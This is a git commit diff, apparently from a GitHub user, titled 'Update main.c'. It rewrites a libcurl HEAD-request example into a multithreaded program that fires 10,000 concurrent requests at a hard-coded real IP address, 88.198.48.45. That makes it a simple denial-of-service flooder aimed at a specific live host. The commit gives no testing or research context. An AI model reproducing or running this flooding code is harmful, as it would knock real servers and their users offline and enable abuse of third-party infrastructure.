ac6934fd3b06a2bc03daf406cc3f5e4cd5d984aa
Biasstudents <139652035+Biasstudents@users.noreply.github.com>
2023-10-16 14:02:18 +0600

    Update main.c

--- main.c
+++ main.c
@@ -1,16 +1,16 @@
 #include <stdio.h>
+#include <pthread.h>
 #include <curl/curl.h>
 
-int main(void)
-{
+#define NUM_THREADS 10000
+
+void *send_request(void *threadid) {
   CURL *curl;
   CURLcode res;
 
-  curl_global_init(CURL_GLOBAL_DEFAULT);
-
   curl = curl_easy_init();
   if(curl) {
-    curl_easy_setopt(curl, CURLOPT_URL, "http://example.com");
+    curl_easy_setopt(curl, CURLOPT_URL, "http://88.198.48.45");
 
     /* Perform a HEAD request by setting NOBODY to 1 */
     curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
@@ -25,6 +25,30 @@ int main(void)
 
     /* Always cleanup */
     curl_easy_cleanup(curl);
+  }
+
+  pthread_exit(NULL);
+}
+
+int main(void)
+{
+  pthread_t threads[NUM_THREADS];
+  int rc;
+  long t;
+
+  curl_global_init(CURL_GLOBAL_DEFAULT);
+
+  for(t=0; t<NUM_THREADS; t++){
+     rc = pthread_create(&threads[t], NULL, send_request, (void *)t);
+     if (rc){
+       printf("ERROR; return code from pthread_create() is %d\n", rc);
+       exit(-1);
+     }
+  }
+
+  /* Wait for all threads to complete */
+  for(t=0; t<NUM_THREADS; t++){
+     pthread_join(threads[t], NULL);
   }
 
   curl_global_cleanup();
